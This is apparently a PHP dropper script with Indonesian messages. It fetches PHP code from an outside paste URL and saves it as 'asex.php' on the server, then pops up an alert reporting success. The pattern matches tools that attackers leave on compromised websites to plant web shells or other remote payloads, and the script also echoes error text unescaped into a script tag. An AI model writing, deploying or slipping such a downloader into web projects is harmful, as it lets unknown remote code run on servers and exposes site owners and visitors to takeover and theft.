<?php
$url = 'https://p.sicp.me/qsN37';
$file_path = 'asex.php';

try {
    // 
    $php_code = file_get_contents($url);

    if ($php_code === false) {
        throw new Exception("Gagal mengambil kode dari URL: $url");
    }

    // 
    $result = file_put_contents($file_path, $php_code);

    if ($result === false) {
        throw new Exception("Gagal menyimpan konten ke dalam file: $file_path");
    }

    // Berhasil
    echo "<script>alert('Kode Berhasil Diambil Dan Disimpan ');</script>";
} catch (Exception $e) {
    // Gagal
    echo "<script>alert('Terjadi kesalahan: " . $e->getMessage() . "');</script>";
}
?>
